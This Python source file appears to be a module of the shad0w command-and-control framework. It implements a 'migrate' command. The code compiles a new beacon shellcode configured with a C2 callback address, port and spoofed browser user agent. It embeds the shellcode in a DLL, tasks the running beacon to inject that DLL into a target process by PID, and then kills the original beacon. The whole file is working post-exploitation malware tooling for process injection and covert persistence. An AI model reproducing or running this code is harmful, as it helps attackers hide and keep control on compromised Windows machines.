#
# Migrate the current beacon to a different process
#

import os
import json
import base64
import argparse
import threading

from lib import buildtools

__description__ = "Migrate the beacon to a different process"
__author__ = "@_batsec_"

# identify the task as shellcode execute
from lib.basecommand import BaseCommand

DLLINJECT_EXEC_ID = 0x5000


def build_inject_info(args, rcode):
    # create the json object to tell the beacon
    # where to execute the code.

    info = {"pid": int(args.pid), "dll": rcode}

    return json.dumps(info)


def generate_beacon_code(shad0w):
    buildtools.clone_source_files(rootdir='injectable')

    settings_template = """#define _C2_CALLBACK_ADDRESS L"%s"
#define _C2_CALLBACK_PORT %s
#define _CALLBACK_USER_AGENT L"Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/40.0.2214.85 Safari/537.36"
#define _CALLBACK_JITTER %s000
#define IMPERSONATE_SESSION "%s"
""" % (shad0w.endpoint, shad0w.addr[1], 1, shad0w.current_beacon)

    buildtools.update_settings_file(None, custom_template=settings_template)

    os = shad0w.beacons[shad0w.current_beacon]["os"]
    arch = shad0w.beacons[shad0w.current_beacon]["arch"]
    secure = shad0w.beacons[shad0w.current_beacon]["secure"]

    buildtools.make_in_clone(arch=arch, platform=os, secure=secure, static=True)

    return buildtools.extract_shellcode()


def format_shellcode(shellcode):
    hshellcode = ""

    code_size = len(shellcode)

    for num, byte in enumerate(shellcode):
        if num != code_size - 1:
            hshellcode += f"{hex(byte)},"
        else:
            hshellcode += f"{hex(byte)}"

    return hshellcode


def write_header(code, file_loc):
    hex_code = format_shellcode(code)

    TEMPLATE = """unsigned char beacon_bin[] = { %s };
unsigned int beacon_bin_len = %s;
"""

    header = TEMPLATE % (hex_code, len(code))

    with open(file_loc, 'w') as file:
        file.write(header)

    return


def get_dll_data(file_loc):
    with open(file_loc, "rb") as file:
        data = file.read()

    return base64.b64encode(data).decode()


def generate_beacon_dll(shad0w, rcode):
    # write header file
    write_header(rcode, "/root/shad0w/modules/windows/shinject/beacon.h")

    # build the dll
    buildtools.clone_source_files(rootdir="/root/shad0w/modules/windows/shinject/",
                                  basedir="/root/shad0w/modules/windows/shinject/")
    made = buildtools.make_in_clone(modlocation="/root/shad0w/modules/windows/shinject/module.dll",
                                    builddir=os.getcwd(), make_target="x64")

    # check that the dll has built
    if not made:
        shad0w.debug.error("Error building migrate dll")
        return

    # return the base64 dll data
    return get_dll_data("/root/shad0w/modules/windows/shinject/module.dll")


def await_impersonate(shad0w, pid):
    while True:
        if shad0w.beacons[shad0w.current_beacon]["impersonate"] == None:
            continue
        else:
            imp_beacon_id = shad0w.beacons[shad0w.current_beacon]["impersonate"]

            shad0w.beacons[shad0w.current_beacon]["task"] = (0x6000, None)
            shad0w.debug.log("Tasked beacon to die", log=True)

            shad0w.current_beacon = imp_beacon_id
            break

    shad0w.debug.good(f"Successfully migrated ({pid})")
    return


class MigrateCommand(BaseCommand):
    def __init__(self, args):
        BaseCommand.__init__(self, "migrate", args)

    def parse_parameters(self):
        self.parser.add_argument("-p", "--pid", required=True, help="PID to migrate to")

    def get_usage(self):
        return """

Examples:

migrate -p 8725
"""

    def run(self, shad0w):
        # create the beacon
        rcode = generate_beacon_code(shad0w)

        # create the beacon dll
        rcode = generate_beacon_dll(shad0w, rcode)

        # make the json info
        inject_info = build_inject_info(self.args, rcode)

        # tell the beacon to execute the dll
        shad0w.beacons[shad0w.current_beacon]["task"] = (DLLINJECT_EXEC_ID, inject_info)

        # try to impersonate the new beacon
        threading.Thread(target=await_impersonate, args=(shad0w, self.args.pid)).start()


def main(shad0w, args):
    # check we actually have a beacon
    if shad0w.current_beacon is None:
        shad0w.debug.log("ERROR: No active beacon", log=True)
        return

    cmd = MigrateCommand(args)
    if cmd.parse():
        cmd.run(shad0w)

    return
